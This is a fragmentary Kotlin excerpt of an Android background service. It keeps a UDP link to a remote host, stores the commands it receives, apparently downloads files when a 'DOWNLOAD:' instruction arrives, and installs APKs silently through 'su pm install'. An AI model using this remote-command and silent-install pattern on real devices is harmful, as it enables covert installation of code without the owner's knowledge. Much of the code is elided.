...
class HeadlessService : Service() {
    ...
    private fun startUdpSocketAndWorkers() {
        scope.launch {
            try {
                udpSocket = DatagramSocket(udpPort, InetAddress.getByName(remoteHost)).apply {
                    soTimeout = 0
                }
                writeLog("udp socket created, bound to port $udpPort. remote=$remoteHost:$remotePort")
            } catch (e: Throwable) {
            ...
            scope.launch {
                ...
                while (isActive) {
                    try {
                        ...
                        val filename = "udp_${System.currentTimeMillis()}.bin"
                        saveToShared(filename, data)
                        writeLog("udp recv saved: $filename size=$len from ${pkt.address.hostAddress}:${pkt.port}")
                        // 如果协议里包含 DOWNLOAD: 指令，触发下载
            ...
            scope.launch {
                ...
                while (isActive) {
                    try {
                        ...
                        val pkt = DatagramPacket(bytes, bytes.size, remoteAddr, remotePort)
                        socket.send(pkt)
                        writeLog("udp sent: ${payload.take(200)} -> ${remoteAddr.hostAddress}:$remotePort")
                    } catch (e: Throwable) {
    ...
    private fun installApkSilently(apkPath: String): Boolean {
        return try {
            val cmd = arrayOf("su", "-c", "pm install -r \"$apkPath\"")
